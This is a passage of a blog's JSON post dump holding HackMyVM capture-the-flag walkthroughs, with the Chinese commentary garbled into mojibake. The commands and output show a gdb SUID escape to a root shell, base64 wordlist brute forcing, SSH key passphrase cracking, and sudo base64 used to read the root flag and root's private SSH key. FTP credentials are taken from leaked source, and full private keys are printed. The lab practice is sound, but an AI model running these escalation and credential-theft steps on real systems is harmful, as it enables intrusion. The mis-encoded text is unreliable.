ææƒç”¨pythonè·å¾—ä¸€ä¸ªæ›´å¥½çš„ç»ˆç«¯ 12$ python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;www-data@connection:/$ æŸ¥æ‰¾suidæ–‡ä»¶ 1234567891011121314www-data@connection:/$ find / -perm -u=s 2&gt;/dev/nullfind / -perm -u=s 2&gt;/dev/null/usr/lib/eject/dmcrypt-get-device/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/bin/newgrp/usr/bin/umount/usr/bin/su/usr/bin/passwd/usr/bin/gdb/usr/bin/chsh/usr/bin/chfn/usr/bin/mount/usr/bin/gpassw å¯ä»¥åˆ©ç”¨gdbè¿›è¡Œsuidææƒ https://gtfobins.github.io/gtfobins/gdb/ 1234567891011121314151617181920www-data@connection:/$ gdb -nx -ex &#x27;python import os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quit&lt;mport os; os.execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-p&quot;)&#x27; -ex quitGNU gdb (Debian 8.2.1-2+b3) 8.2.1Copyright (C) 2018 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.Type &quot;show copying&quot; and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at: &lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.# ididuid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data) å‘ç°è¿›åˆ°rootç»„é‡Œäº†ï¼Œææƒç»“æŸ","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-BaseME","slug":"HackmyVM-BaseME","date":"2025-01-22T13:12:15.000Z","updated":"2025-04-19T13:25:36.810Z","comments":true,"path":"2025/01/22/HackmyVM-BaseME/","permalink":"https://lvzhouhang.xyz/2025/01/22/HackmyVM-BaseME/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -l 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.232 08:00:27:d9:d3:0c PCS Systemtechnik GmbH4 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.973 seconds (129.75 hosts/sec). 4 responded ipä¸º192.168.31.220ï¼Œnmapæ‰«æç«¯å£ 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.232 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 08:13 ESTNmap scan report for baseme (192.168.31.232)Host is up (0.0065s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:D9:D3:0C (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 21.46 seconds 80ç«¯å£123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# curl 192.168.31.232QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&lt;!--iloveyouyouloveyoushelovesyouhelovesyouweloveyoutheyhatesme--&gt; ç»™äº†ä¸€ä¸²base64å’Œå‡ ä¸ªå­—ç¬¦ä¸² base64è§£ç å†…å®¹ä¸ºï¼š 123456â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# echo &quot;QUxMLCBhYnNvbHV0ZWx5IEFMTCB0aGF0IHlvdSBuZWVkIGlzIGluIEJBU0U2NC4KSW5jbHVkaW5nIHRoZSBwYXNzd29yZCB0aGF0IHlvdSBuZWVkIDopClJlbWVtYmVyLCBCQVNFNjQgaGFzIHRoZSBhbnN3ZXIgdG8gYWxsIHlvdXIgcXVlc3Rpb25zLgotbHVjYXMK&quot;|base64 -dALL, absolutely ALL that you need is in BASE64.Including the password that you need :)Remember, BASE64 has the answer to all your questions.-lucas å¯ä»¥çŸ¥é“ç”¨æˆ·åä¸ºlucasï¼Œå¹¶ä¸”æ‰€æœ‰å†…å®¹éƒ½è¦è¿›è¡Œbase64ã€‚ å°†å­—å…¸è¿›è¡Œbase64ç¼–ç ï¼Œç„¶åæ‰«æç›®å½• 123456789101112131415161718192021222324â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt|while read line;do for i in $line;echo $i|base64 &gt;&gt;1;doneâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.232&quot; -w ./1===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.232[+] Method: GET[+] Threads: 10[+] Wordlist: ./1[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/aWRfcnNhCg== (Status: 200) [Size: 2537]/cm9ib3RzLnR4dAo= (Status: 200) [Size: 25]Progress: 4736 / 4737 (99.98%)===============================================================Finished=============================================================== è¿™ä¸¤ä¸ªæ–‡ä»¶åˆ†åˆ«æ˜¯id_rsaå’Œrobots.txt 1234567â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# echo &quot;aWRfcnNhCg==&quot;|base64 -did_rsaâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# echo &quot;cm9ib3RzLnR4dAo=&quot;|base64 -drobots.txt robots.txté‡Œä»€ä¹ˆä¹Ÿæ²¡æœ‰ 12345678910111213141516171819202122232425262728293031323334â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# base64 cm9ib3RzLnR4dAo= -dNothing here :(â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# base64 aWRfcnNhCg=\\= -d-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABBTxe8YULBtzfftAdPgp8YZAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQCZCXvEPnO1cbhxqctBEcBDZjqrFfolwVKmpBgY07M3CK7pO10UgBsLyYwAzJEw4e6YgPNSyCDWFaNTKG07jgcgrggre8ePCMNFBCAGaYHmLrFIsKDCLI4NE54t58IUHeXCZz72xTobL/ptLk26RBnh7bHG1JjGlxOkO6m+1oFNLtNuD2QPl8sbZtEzX4S9nNZ/dpyRpMfmB73rN3yyIylevVDEyvf7CZ7oRO46uDgFPy5VzkndCeJF2YtZBXf5gjc2fajMXvq+b8ol8RZZ6jHXAhiblBXwpAm4vLYfxzI27BZFnoteBnbdzwSL5apBF5gYWJAHKj/J6MhDj1GKAFc1AAAD0N9UDTcUxwMt5XYFIZK8ieBL0NOuwocdgbUuktC21SdnSy6ocW3imM+3mzWjPdoBK/Ho339uPmBWI5sbMrpKxkZMnl+rcTbgz4swv8gNuKhUc7wTgtrNX+PNMdIALNpsxYLt/l56GK8R4J8fLIU5+MojRs+1NrYs8J4rnO1qWNoJRZoDlAaYqBV95cXoAEkwUHVustfgxUtrYKp+YPFIgx8okMjJgnbiNNW3TzxluNi5oUhalH2DJ2khKDGQUi9ROFcsEXeJXt3lgpZZt1hrQDA1o8jTXeS4+dW7nZzjf3p0M77b/NvcZE+oXYQ1g5Xp1QSOSbj+tlmw54L7Eqb1UhZgnQ7ZsKCoaY9SuAcqm3E0IJh+I+Zv1egSMS/DOHIxO3psQkciLjkpa+GtwQMl1ZAJHQaB6q70JJcBCfVsykdY52LKDIpxZYpLZmyDx8TTaA8JOmvGpfNZkMU4I0i5/ZT65SRFJ1NlBCNwcwtOl9k4PW5LVxNsGRCJMJr8k5Ac0CX03fXESpmsUUVS+/Dj/hntHw89dO8HcqqIUEpeEbfTWLvax0CiSh3KjSceJp+8gUyDGvCkcyVneUQjmmrRswRhTNxxKRBZsekGwHpo8hDYbUEFZqzzLAQbBIAdrl1tt7mVtVBrmpM6CwJdzYEl21FaK8jvdyCwPr5HUgtuxrSpLvndcnwPaxJWGi4P471DDZeRYDGcWhi6bICrLQgeJlHaEUmrQC5Rdv03zwI9U8DXUZ/OHb40PL8MXqBtU/b6CEU9JuzJpBrKZ+k+tSn7hr8hppT2tUSxDvC+USMmw/WDfakjfHpoNwh7Pt5i0cwwpkXFQxJPvR0bLxvXZn+3xwN7bw45FhBZCsHCAbV2+hVsP0lyxCQOj7yGkBja87S1e0q6WZjjB4SprenHkO7tg5Q0HsuMAif/02HHzWG+CR/IGlFsNtq1vylt2x+Y/091vCkROBDawjHz/8ogy2Fzg8JYTeoLkHwDGQO+TowA10RATek6ZEIxh6SmtDG/V5zeWCuEmK4sRT3q1FSvpB1/H+FxsGCoPIg8FzciGCh2TLuskcXiagns9N1RLOnlHhiZd8RZA0Zg7oZIaBvaZnhZYGycpAJpWKebjrtokLYuMfXRLl3/SAeUl72EA3m1DInxsPguFuk00roMc77N6erY7tjOZLVYPoSiygDR1A7f3zYz+0iFI4rLND8ikgmQvF6hrwwJBrp/0xKEaMTCKLvyyZ3eDSdBDPrkThhFwrPpI6+Ex8RvcWI6bTJAWJLdmmRXUS/DtO+69/aidvxGAYob+1M=-----END OPENSSH PRIVATE KEY----- 80ç«¯å£ç»™äº†å‡ ä¸ªå­—ç¬¦ä¸²å°±æ˜¯å­—å…¸ï¼Œbase64ç¼–ç åçˆ†ç ´id_rsaçš„å¯†ç  1234567891011121314151617â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat 1|while read line;do for i in $line;echo $i|base64 &gt;&gt;1;doneâ”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat 1iloveyouyouloveyoushelovesyouhelovesyouweloveyoutheyhatesmeaWxvdmV5b3UKeW91bG92ZXlvdQo=c2hlbG92ZXN5b3UKaGVsb3Zlc3lvdQo=d2Vsb3ZleW91Cg==dGhleWhhdGVzbWUK 123456789101112131415161718â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ssh2john id_rsa&gt;1â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# john 1 -w=1Using default input encoding: UTF-8Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])No password hashes left to crack (see FAQ)â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# john 1 -w=1 --showInvalid options combination: &quot;--show&quot;â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# john 1 --showid_rsa:aWxvdmV5b3UK1 password hash cracked, 0 left lucasç”¨æˆ·çš„å¯†ç å°±æ˜¯aWxvdmV5b3UK ææƒsshç™»å½•æ‹¿åˆ°user.txt sudo -lå¯ä»¥æ— å¯†ç è¿è¡Œbase64ï¼Œç›´æ¥è¯»å–/root/root.txt 123456789101112131415161718192021222324lucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/root.txt|base64 -dsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname . ** * *. ,* *, , ,* ., *, / * ,* *, /. .*. * ** ,* ,* ** *. ** **. ,* ** *, ,* * ** *, .* *. ** ** ,*, ** *,HMVFKBS64 æƒ³ææƒåˆ°rootçš„è¯éœ€è¦è¯»å–id_rsa 1234567891011121314151617181920212223242526272829lucas@MiWiFi-RA71-srv:~$ sudo -u root base64 /root/.ssh/id_rsa|base64 -dsudo: unable to resolve host MiWiFi-RA71-srv: No address associated with hostname-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAw6MgMnxUy+W9oem0Uhr2cJiez37qVubRK9D4kdu7H5NQ/Z0FFp2BIdV3wx9xDWAICJgtYQUvOV7KFNAWvEXTDdhBwdiUcWEJ4AOXK7+5v7x4b8vuG5zK0lTVxpDEBE8faPj3UaHsa1JUVaDngTIkCa6VBICvG0DCcfL8xHBpCSIfoHfpqmOpWT/pWXvGI3tk/Ku/STY7Ay8HtSgoqCcf3F+lb9J9kwKhFg9eLO5QDuFujb1CN7gUy8xhgNanUViyCZRwn7px+DfU+nscSEfG1zgfgqn2hCbBYqaP0jBgWcVL6YoMiwCS3jhmeFG4C/p51j3gI6b8yz9aS+DtdTpDwQAAA8D82/wZ/Nv8GQAAAAdzc2gtcnNhAAABAQDDoyAyfFTL5b2h6bRSGvZwmJ7PfupW5tEr0PiR27sfk1D9nQUWnYEh1XfDH3ENYAgImC1hBS85XsoU0Ba8RdMN2EHB2JRxYQngA5crv7m/vHhvy+4bnMrSVNXGkMQETx9o+PdRoexrUlRVoOeBMiQJrpUEgK8bQMJx8vzEcGkJIh+gd+mqY6lZP+lZe8Yje2T8q79JNjsDLwe1KCioJx/cX6Vv0n2TAqEWD14s7lAO4W6NvUI3uBTLzGGA1qdRWLIJlHCfunH4N9T6exxIR8bXOB+CqfaEJsFipo/SMGBZxUvpigyLAJLeOGZ4UbgL+nnWPeAjpvzLP1pL4O11OkPBAAAAAwEAAQAAAQBIArRoQOGJh9AMWBS6oBgUC+lw4Ptq710Q7sOAFMxE7BnEsFZeI62TgZqqpNkdHjr2xuT1ME5YpK5niMzFkkIEd5SEwK6rKRfUcB3lyZWaoMoIBJ1pZoY1c2qYw1KTb3hVUEbgsmRugIhwWGC+anFfavaJCMDrnCO2g8VMnT/cTyAv/Qmi8m868KNEzcuzGV5ozHl1XLffHM9R/cqPPyAYaQIa9Z+kS6ou9RiMTjTSxOPnfh286kgx0ry1se9BBlrEc5251R/PRkEKYrMj3AIwI30qvYlAtNfcCFhoJXLqvWystPARwiUs7WYBUHRf6bPP/pHTTvwwb2bs51ngImpdAAAAgDaWnQ7Lj7Vp+mTjhSu4oGptDHNd2uuqB1+CHRcaVutUmknxvxG3p957UbvNp6e0+ePKtAIakrzbpAo6u25poyWugAuzX2nQhqsQh6yrThDJlTiDMeV7JNGFbGOcanXXXHt3tjfyrS0+aM87WmwqNyh6nfgy1C5axRfKZG8ivz5iAAAAgQD83QmCIcbZaCOlGwgHGcuCUDcxGY1QlIRnbM5VAjimNezGFs9f0ExDSiTwFsmITP//njsbRZP2laiKKO6j4yp5LpfgDB5QHs+g4nXvDn6ns64gCKo7tf2bPP8VCeFWyc2JyqREwE3WmyhkPlyr9xAZerZ+7Fz+NFueRYzDklWg8wAAAIEAxhBeLqbo6/GUKXF5rFRatLXI43Jrd9pyvLx62KghsnEBEk7my9sbU5dvYBLztS+lfPCRxV2ZzpjYdN4SDJbXIRtxBaLJe3c4uIc9WjyxGwUK9IL65rSrRVERHsTO525ofPWGQEa2A+pRCpz3A4Y41fy8Y9an2B2NmfTAfEkWFXsAAAALcm9vdEBiYXNlbWU=-----END OPENSSH PRIVATE KEY----- 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ssh root@192.168.31.232 -i id_rsaLinux MiWiFi-RA71-srv 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Wed Jan 22 08:08:11 2025 from 192.168.31.129root@MiWiFi-RA71-srv:~# æ€»ç»“åœ¨å¤„ç†å­—å…¸çš„æ—¶å€™è¿˜å¯ä»¥æœ‰æ›´é«˜æ•ˆçš„æ–¹æ³•ï¼Œå…¶ä»–çš„å°±æ²¡å•¥äº†","categories":[{"name":"HackMyVM","slug":"HackMyVM","permalink":"https://lvzhouhang.xyz/categories/HackMyVM/"}],"tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"}]},{"title":"HackmyVM-Pwned","slug":"HackmyVM-Pwned","date":"2025-01-22T06:22:18.000Z","updated":"2025-04-19T13:25:36.808Z","comments":true,"path":"2025/01/22/HackmyVM-Pwned/","permalink":"https://lvzhouhang.xyz/2025/01/22/HackmyVM-Pwned/","excerpt":"","text":"ä¿¡æ¯æœé›†arp-scan -læ‰«æip 123456789101112â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# arp-scan -lInterface: eth0, type: EN10MB, MAC: 00:0c:29:7d:7d:cf, IPv4: 192.168.31.129Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)192.168.31.1 a4:a9:30:df:ef:44 (Unknown)192.168.31.51 08:00:27:c4:72:27 PCS Systemtechnik GmbH192.168.31.220 46:3e:62:f9:1e:fa (Unknown: locally administered)192.168.31.187 a6:9b:e0:2d:30:9a (Unknown: locally administered)192.168.31.85 7e:2c:58:df:4e:cb (Unknown: locally administered)5 packets received by filter, 0 packets dropped by kernelEnding arp-scan 1.10.0: 256 hosts scanned in 1.986 seconds (128.90 hosts/sec). 5 responded ipä¸º192.168.31.51ï¼Œç„¶ånmapæ‰«æå¼€æ”¾ç«¯å£ 12345678910111213â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# nmap 192.168.31.51 --min-rate=1000 -p-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-22 01:21 ESTNmap scan report for pwned (192.168.31.51)Host is up (0.00019s latency).Not shown: 65532 closed tcp ports (reset)PORT STATE SERVICE21/tcp open ftp22/tcp open ssh80/tcp open httpMAC Address: 08:00:27:C4:72:27 (Oracle VirtualBox virtual NIC)Nmap done: 1 IP address (1 host up) scanned in 13.85 seconds å¼€æ”¾äº†21,22,80ç«¯å£ 80ç«¯å£1234567891011121314151617181920212223â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.51&quot; -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.51[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/nothing (Status: 301) [Size: 316] [--&gt; http://192.168.31.51/nothing/]/server-status (Status: 403) [Size: 278]/hidden_text (Status: 301) [Size: 320] [--&gt; http://192.168.31.51/hidden_text/]Progress: 220559 / 220560 (100.00%)===============================================================Finished=============================================================== /nothing: 1i said nothing bro /hidden_text: 123456789101112131415161718192021/hacked/vanakam_nanba/hackerman.gif /facebook/whatsapp/instagram/pwned/pwned.com/pubg /cod/fortnite/youtube/kali.org/hacked.vuln/users.vuln/passwd.vuln/pwned.vuln/backup.vuln/.ssh/root/home åˆ©ç”¨ç»™çš„ç›®å½•æ‰«æ 123456789101112131415161718192021â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# gobuster dir -u &quot;http://192.168.31.51&quot; -w ./secret.dic===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://192.168.31.51[+] Method: GET[+] Threads: 10[+] Wordlist: ./secret.dic[+] Negative Status codes: 404[+] User Agent: gobuster/3.6[+] Timeout: 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/pwned.vuln (Status: 301) [Size: 319] [--&gt; http://192.168.31.51/pwned.vuln/]Progress: 22 / 23 (95.65%)===============================================================Finished=============================================================== å‰ç«¯ç»™äº†æºç  1234567891011121314&lt;?php// if (isset($_POST[&#x27;submit&#x27;])) &#123;// $un=$_POST[&#x27;username&#x27;];// $pw=$_POST[&#x27;password&#x27;];//// if ($un==&#x27;ftpuser&#x27; &amp;&amp; $pw==&#x27;B0ss_B!TcH&#x27;) &#123;// echo &quot;welcome&quot;// exit();// &#125;// else // echo &quot;Invalid creds&quot;// &#125;?&gt; è¿™æ˜¯ftpçš„è´¦å·ç„¶åç™»å½•ftp 21ç«¯å£123456ftp&gt; ls -la229 Entering Extended Passive Mode (|||48619|)150 Here comes the directory listing.drwxrwxrwx 3 0 0 4096 Jul 09 2020 .drwxr-xr-x 5 0 0 4096 Jul 10 2020 ..drwxr-xr-x 2 0 0 4096 Jul 10 2020 share æœ‰ä¸€ä¸ªshareæ–‡ä»¶å¤¹ï¼Œæ–‡ä»¶å¤¹æœ‰id_rsaå’Œnote.txt 123456ftp&gt; ls229 Entering Extended Passive Mode (|||53927|)150 Here comes the directory listing.-rw-r--r-- 1 0 0 2602 Jul 09 2020 id_rsa-rw-r--r-- 1 0 0 75 Jul 09 2020 note.txt226 Directory send OK. getä¸‹è½½ä¸‹æ¥ 1234567891011121314ftp&gt; get id_rsalocal: id_rsa remote: id_rsa229 Entering Extended Passive Mode (|||26918|)150 Opening BINARY mode data connection for id_rsa (2602 bytes).100% |***************************************************************************| 2602 350.29 KiB/s 00:00 ETA226 Transfer complete.2602 bytes received in 00:00 (308.45 KiB/s)ftp&gt; get note.txtlocal: note.txt remote: note.txt229 Entering Extended Passive Mode (|||52418|)150 Opening BINARY mode data connection for note.txt (75 bytes).100% |***************************************************************************| 75 34.79 KiB/s 00:00 ETA226 Transfer complete.75 bytes received in 00:00 (21.66 KiB/s) æ–‡ä»¶å†…å®¹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat id_rsa-----BEGIN OPENSSH PRIVATE KEY-----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-----END OPENSSH PRIVATE KEY-----â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# cat note.txtWow you are hereariana won&#x27;t happy about this notesorry ariana :( ç»™äº†sshçš„ç§é’¥å’Œç”¨æˆ·å,ç»™id_rsaæ–‡ä»¶600çš„æƒé™ç„¶åç™»å½• 123456789101112131415161718â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/tmp]â””â”€# ssh ariana@192.168.31.51 -i id_rsaThe authenticity of host &#x27;192.168.31.51 (192.168.31.51)&#x27; can&#x27;t be established.ED25519 key fingerprint is SHA256:Eu7UdscPxuaxyzophLkeILniUaKCge0R96HjWhAmpyk.This key is not known by any other names.Are you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#x27;192.168.31.51&#x27; (ED25519) to the list of known hosts.Linux pwned 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Fri Jul 10 13:03:23 2020 from 192.168.18.70ariana@pwned:~$ lsariana-personal.diary user1.txt ææƒ123456ariana@pwned:/$ sudo -lMatching Defaults entries for ariana on pwned: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/binUser ariana may run the following commands on pwned: (selena) NOPASSWD: /home/messenger.sh å¯ä»¥ä»¥selenaç”¨æˆ·ï¼Œæ— å¯†ç è¿è¡Œ/home/messenger.sh messenger.shçš„å†…å®¹ï¼š 123456789101112131415161718192021ariana@pwned:/home$ cat messenger.sh#!/bin/bashclearecho &quot;Welcome to linux.messenger &quot; echo &quot;&quot;users=$(cat /etc/passwd | grep home | cut -d/ -f 3) echo &quot;&quot;echo &quot;$users&quot; echo &quot;&quot;read -p &quot;Enter username to send message : 